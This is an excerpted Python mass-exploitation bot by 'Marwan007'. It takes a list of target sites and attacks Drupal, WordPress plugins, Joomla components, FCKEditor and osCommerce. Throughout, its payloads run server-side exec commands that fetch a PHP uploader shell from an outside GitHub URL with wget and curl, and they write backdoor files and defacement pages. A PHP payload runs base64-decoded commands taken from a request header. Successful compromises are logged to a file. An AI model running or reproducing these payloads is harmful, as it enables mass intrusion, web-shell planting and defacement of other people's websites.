...
start_raw = raw_input("\n\033[92m[!]\033[91m  ENTER YOUR LIST : ")
try:
...
indecx = "Files/007.html"
filevid = "Files/007.PhP.txt"
indexxx = "Files/007.txt"
louis = "Files/up.php"
payloadz = "<?php error_reporting(0);print(system('wget https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php'));passthru(base64_decode($_SERVER[HTTP_CMD]));die; ?>"
com_jdownloads = 'Files/up.php3.g'
com_jdownloads_index = 'Files/pwn.gif'
Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
user_agent = "Mozilla/5.0 (iPhone; CPU iPhone OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3"
payload = """  fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Manager.php','w+'),file_get_contents('https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php')); fwrite(fopen($_SERVER['DOCUMENT_ROOT']."/libraries/respectMuslims.php","w+"),file_get_contents("https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php"));fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Fuckedz.htm','w+'),' Vulnerability! Fuckedz By En Banglasia! ');"""
...
def drupal(url):
    ...
    try:	
		...
		get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'curl https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php && wget https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php', 'name[#type]':'markup'}
		...
		if re.findall("Marwan007", lib.content):
		...
		Index_page = "echo 'Defaced By Marwan007' > def.htm"
		...
		if re.findall("Defaced By Marwan007", lib.content):
		...
		if re.findall("Marwan 007 Shell", lib.content):
		...
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'wget https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php && curl https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php'}
		...
		if 'Marwan007' in requests.get(url+'/up.php', verify=False, headers=headers).text:
		...
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'curl https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php && wget https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'Marwan007' in requests.get(url+'/up.php', headers=headers).text:
		...
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail["a"][#lazy_builder][0]': 'exec', 'mail["a"][#lazy_builder][1][]': 'curl https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php && wget https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		r = requests.post(url+ '/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, verify=False, headers=headers)
		if 'Marwan007' in requests.get(url+'/up.php', headers=headers).text:
		...
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'timezone[a][#lazy_builder][]': 'exec', 'timezone[a][#lazy_builder][][]': 'curl https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php && wget https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php'}
		headers = {'User-Agent': 'Mozilla 5.0'}				
		...
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup', 'mail[#markup]': 'echo Marwan 007 Shell!! Defaced it Now!> def.htm'}
		...
		headers = {'User-Agent': 'Mozilla 5.0'}	
		payload = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec',
                   'mail[#type]': 'markup', 'mail[#markup]': 'echo Defaced By Marwan007> def.htm'}
		payload2 = {'form_id': 'user_register_form', '_drupal_ajax': '1', 'mail[#post_render][]': 'exec', 'mail[#type]': 'markup', 'mail[#markup]': 'echo "' + shell + '"> vuln.php'}			
		ar = requests.post(url+'/user/register/?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax', data=payload, timeout=5)
		if 'Defaced By Marwan007' in requests.get(url+'/def.htm', headers=headers).text:
			print '\033[92m[>] \033[0mExploit Drupal 8 Index  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/def.htm'+'\n')
			sys.exit()
...
def wordpress(url):
    ...
    try:
		...
		if 'Marwan007' in formlib.content:
		...
		if 'Marwan007' in manalib.content:
		...
		if 'Marwan007' in jssorlib.content:
		...
		if 'Marwan007' in revsliderlib.content:
		...
		if 'Marwan007' in showbizlib.content:
		...
		if 'Marwan007' in Reflexlib.content:
		...
		if 'Marwan007' in categorylib.content:
		...
		if 'Marwan 007 Shell' in Wysijalib.content:
			print '\033[92m[>] \033[0mExploit wysija  \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
		...
		if 'Marwan 007 Shell ' in LearnDashlib.content:
		...
		if 'Marwan007' in Tevorlib.content:
		...
		if 'Marwan007' in Cherrylib.content:
		...
		if 'Marwan 007 Shell' in Gravkglib.content:
		...
		if 'Marwan 007 Shell' in aaReflexlib.content:
		...
		if 'Marwan 007 Shell' in aReflexlib.content:
		...
		if 'Marwan 007 Shell' in bReflexlib.content:
		...
		if 'Marwan 007 Shell' in Gravlib.content:
		...
		if 'Marwan 007 Shell' in Gravklib.content:
		...
		if 'Marwan 007 Shell' in revsliderlib.content:
		...
		if 'Marwan 007 Shell' in showbizlib.content:
		...
		if 'Marwan 007 Shell' in Reflexlib.content:
		...
		if 'Marwan 007 Shell' in Tevorlib.content:
		...
		if 'Marwan 007 Shell' in Cherrylib.content:
		...
		if 'Marwan 007 Shell' in propertylib.content:
		...
		if 'Marwan 007 Shell' in simplelib.content:
		...
		if 'Hacked By Marwan007' in dayilib.content:
		...
		if 'Marwan 007 Shell' in eptoniclib.content:
		...
		if 'Marwan 007 Shell' in saicolib.content:
		...
		if 'Marwan 007 Shell' in barclaycartlib.content:
		...
		if 'Marwan 007 Shell' in sexylib.content:
		...
		if 'Marwan 007 Shell' in pinboardlib.content:
		...
		if 'Marwan 007 Shell' in pitchprintlib.content:
		...
		if 'Marwan 007 Shell' in evolvelib.content:
		...
		if 'Marwan 007 Shell' in satoshilib.content:
		...
		if 'Marwan 007 Shell' in dandelionlib.content:
		...
		if 'Marwan 007 Shell' in highlightlib.content:
		...
		if 'Marwan 007 Shell' in ithemeslib.content:
		...
		if 'Marwan 007 Shell' in customlib.content:
		...
		if 'Marwan 007 Shell' in ampluslib.content:
		...
		if 'Marwan 007 Shell' in cnhklib.content:
		...
		if 'Marwan 007 Shell' in assetlib.content:
		...
		if 'Marwan 007 Shell' in sonzlib.content:
		...
		if 'Marwan 007 Shell' in cubedslib.content:
		...
		if 'Marwan 007 Shell' in flipbooklib.content:
		...
		if 'Marwan 007 Shell' in wpstorelib.content:
		...
		if 'Marwan 007 Shell' in dancelib.content:
		...
		if 'Marwan 007 Shell' in designlib.content:
		...
		if 'Marwan 007 Shell' in wpshoplib.content:
		...
		if 'Marwan 007 Shell' in symposiumlib.content:
		...
		if 'Marwan 007 Shell' in formcraftlib.content:
		...
		if 'Marwan 007 Shell' in picalib.content:
		...
		if 'Marwan 007 Shell' in sonzslib.content:
		...
		if 'Marwan 007 Shell' in sonzsxlib.content:
		...
		if 'Marwan 007 Shell' in sonzsdlib.content:
		...
		if 'Marwan 007 Shell' in izflib.content:
		...
		if 'Marwan 007 Shell' in acflib.content:
		...
		if 'Marwan 007 Shell' in sonzsxylib.content:
		...
		if 'Marwan 007 Shell' in acfxlib.content:
		...
		if 'Hacked By Marwan007' in aaReflexlib.content:
		...
		if 'Marwan 007 Shell' in zoklib.content:
		...
		if 'Marwan 007 Shell' in bblib.content:
...
def joomlaaa(url):	
    ...
    try:
		...
		if 'Marwan 007 Shell_Ye' in req_rce.content:
			...
			if 'com_foxcontact' in check_fox.content:
				...
				for cid in cids:
					...
					for b0x in blackb0x:
						...
						if 'Marwan 007 Shell' in check_shells:
		...
		if 'Marwan 007 Shell' in fgGravkglib.content:
		...
		'catlist':'1',
		'filetitle':"Vulnerability! Marwan 007 Shell",
		'description':"<p>Vulnerability! Marwan 007 Shell</p>",
		...
		if 'Marwan 007 Shell' in zttGravkglib.content:
		...
		if 'Marwan 007 Shell' in xaynzfeReflexlib.content:
		...
		if 'Marwan 007 Shell' in axaynzfeReflexlib.content:
		...
		if 'Marwan 007 Shell' in bGravlib.content:
		...
		if 'Marwan 007 Shell' in dsbGravlib.content:
		...
		if 'Marwan 007 Shell' in cbGravlib.content:
		...
		if 'Marwan 007 Shell' in eReflexlib.content:
		...
		if 'Marwan 007 Shell' in feReflexlib.content:
		...
		if 'Marwan 007 Shell' in zfeReflexlib.content:
		...
		if 'Marwan 007 Shell' in dzfeReflexlib.content:
		...
		if 'Marwan 007 Shell' in nzfeReflexlib.content:
		...
		if 'Marwan 007 Shell' in wGravklib.content:
		...
		if 'Marwan 007 Shell' in ewGravklib.content:
		...
		if 'Marwan 007 Shell' in awGravklib.content:
		...
		if 'Marwan 007 Shell' in dawGravklib.content:
		...
		if 'Marwan 007 Shell' in xdawGravklib.content:
		...
		if 'Marwan 007 Shell' in zxdawGravklib.content:
		...
		#44 com_jdownloads
			...
			if 'Marwan 007 Shell' in shell_jd.content:
		...
		#45 com_jbcatalog
			...
			if 'jQuery File' in check_jbcatalog.content:
				...
				if 'Marwan 007 Shell' in Shell_jbcatalog.content:
					print '\033[92m[>] \033[0mExploit Com_Jbcatalog  \033[92m[Done] '.format(sn)
	    ...
	    #47 com_b2jcontact2
			...
			if 'Marwan 007 Shell' in check_lib.content:			
		...
		#48 CoM_adsmanager2
			...
			if '{"jsonrpc" : "2.0",' in check_adsm.content:
				...
				if 'Marwan 007 Shell' in check_shell.content:
...
def Unknown(url):
	...
	try:
		...
		if 'Marwan 007 Shell' in lib.content:
		...
		lib = requests.get(url+"/userfiles/file/007.txt")

		if 'Hacked By Marwan007' in lib.content:
			print '\033[92m[>] \033[0mExploit FckEditor \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/userfiles/file/007.txt'+'\n')
			sys.exit()
		else:
		...
		lib = requests.get(url+"/ficheiros/conteudos/007.txt")

		if 'Hacked By Marwan007' in lib.content:
			print '\033[92m[>] \033[0mExploit Netvidade \033[92m[Done] '.format(sb, sd, url, fc,fc, sb,fg)
			open('Exploited/index.txt', 'a').write(url+'/ficheiros/conteudos/007.txt'+'\n')
			sys.exit()
		else:
...
def osrce(url):
    ...
    try:
        ...
        if 'Welcome to osCommerce' in CheckVuln.text.encode('utf-8') or CheckVuln.status_code == 200:
			...
			shell = '\');'
			shell += 'system("wget https://raw.githubusercontent.com/mrwn007/007BOT/master/files/up.php");'
			shell += '/*'
